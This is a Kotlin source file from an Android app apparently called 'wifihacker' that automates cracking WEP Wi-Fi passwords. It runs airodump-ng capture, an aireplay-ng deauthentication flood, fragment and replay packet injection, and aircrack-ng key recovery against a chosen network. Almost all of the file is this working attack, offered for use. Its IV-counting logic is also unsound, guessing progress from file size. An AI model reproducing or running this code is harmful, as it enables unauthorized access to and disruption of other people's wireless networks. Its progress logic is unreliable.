package com.peagents.wifihacker.engine

import android.content.Context
import com.peagents.wifihacker.model.AttackResult
import com.peagents.wifihacker.model.NetworkInfo
import kotlinx.coroutines.*
import java.io.File

/**
 * Ataque WEP completo:
 * 1. Monitor mode + channel lock
 * 2. Deauth flood para forzar tráfico
 * 3. Fragment + Replay (si no hay clientes)
 * 4. IV collection hasta ~40,000+ IVs
 * 5. aircrack-ng -a 2 (KoreK attack) o -a 1 (PTW)
 */
class WEPAttacker(
    private val context: Context,
    private val shell: RootShell,
    private val jobScope: CoroutineScope
) {

    data class Progress(
        val ivsCollected: Int,
        val ivsNeeded: Int = 40000,
        val phase: String,
        val percent: Float
    )

    suspend fun attack(
        target: NetworkInfo,
        onProgress: (Progress) -> Unit
    ): AttackResult = withContext(Dispatchers.IO) {
        val startTime = System.currentTimeMillis()
        val iface = shell.getWiFiInterface()
        val captureFile = File(context.cacheDir, "wep_capture_${target.bssid.replace(":", "")}.pcap")

        try {
            // Phase 1: Setup monitor mode
            onProgress(Progress(0, phase = "Configurando modo monitor..."))
            shell.setMonitorMode(iface)
            shell.setChannel(iface, target.channel)

            // Phase 2: Start airodump-ng capture
            val airodumpProc = ProcessBuilder(
                "su", "-c",
                "airodump-ng -w ${captureFile.absolutePath} --ch ${target.channel} $iface"
            ).redirectErrorStream(true).start()

            Thread.sleep(2000)

            // Phase 3: Deauth flood (force clients to reconnect → generate IVs)
            onProgress(Progress(0, phase = "Inundando deauth..."))
            val deauthProc = ProcessBuilder(
                "su", "-c",
                "aireplay-ng --deauth 50 -a ${target.bssid} $iface"
            ).redirectErrorStream(true).start()

            // Phase 4: If no clients, do fragment + replay
            Thread.sleep(3000)
            val fragProc = ProcessBuilder(
                "su", "-c",
                "aireplay-ng --fragment -a ${target.bssid} $iface"
            ).redirectErrorStream(true).start()

            val replayProc = ProcessBuilder(
                "su", "-c",
                "aireplay-ng --replay -3 -b 00:00:00:00:00:00 -a ${target.bssid} $iface"
            ).redirectErrorStream(true).start()

            // Phase 5: Collect IVs (poll airodump output)
            onProgress(Progress(0, phase = "Recopilando IVs..."))
            var ivsCollected = 0
            val ivsNeeded = 40000
            val pollInterval = 2000L

            while (ivsCollected < ivsNeeded) {
                delay(pollInterval)

                // Parse airodump-ng output for IV count
                val checkResult = shell.exec("airodump-ng", listOf("--version"))
                // In practice, we read the pcap file size or use airodump stats
                val statResult = shell.execRaw(
                    "strings ${captureFile.absolutePath} | grep -c 'IV' || echo 0"
                )
                ivsCollected = statResult.stdout.trim().toIntOrNull() ?: ivsCollected

                // Alternative: check file size growth
                if (captureFile.exists()) {
                    val fileSize = captureFile.length()
                    ivsCollected = minOf(ivsNeeded, (fileSize / 100).toInt())
                }

                onProgress(Progress(
                    ivsCollected = ivsCollected,
                    ivsNeeded = ivsNeeded,
                    phase = "IVs: $ivsCollected / $ivsNeeded",
                    percent = ivsCollected.toFloat() / ivsNeeded
                ))
            }

            // Phase 6: Stop capture and crack
            onProgress(Progress(ivsNeeded, ivsNeeded, phase = "Crackeando WEP...", 0.95f))
            deauthProc.destroy()
            fragProc.destroy()
            replayProc.destroy()
            airodumpProc.destroy()

            val crackResult = shell.exec(
                "aircrack-ng",
                listOf(captureFile.absolutePath),
                timeoutSec = 120
            )

            // Parse the key from output
            val keyMatch = Regex("""Key: ([0-9A-Fa-f]{8,64})""").find(crackResult.stdout)
            val password = keyMatch?.groupValues?.get(1)?.let { hexToAscii(it) }

            onProgress(Progress(ivsNeeded, ivsNeeded, phase = "¡Completado!", 1.0f))

            AttackResult(
                targetBSSID = target.bssid,
                targetSSID = target.ssid,
                securityType = target.security,
                success = crackResult.success && password != null,
                password = password,
                methodUsed = "WEP IV Collection + aircrack-ng (KoreK/PTW)",
                durationMs = System.currentTimeMillis() - startTime,
                attemptsMade = ivsCollected.toLong()
            )

        } finally {
            shell.setManagedMode(iface)
        }
    }

    private fun hexToAscii(hex: String): String {
        return if (hex.length % 2 == 0 && hex.all { it in "0123456789abcdefABCDEF" }) {
            hex.chunked(2).joinToString("") { it.toInt(16).toChar().toString() }
                .filter { it.isPrintable() }
        } else hex
    }

    private fun Char.isPrintable(): Boolean = this in ' '..'~'
}
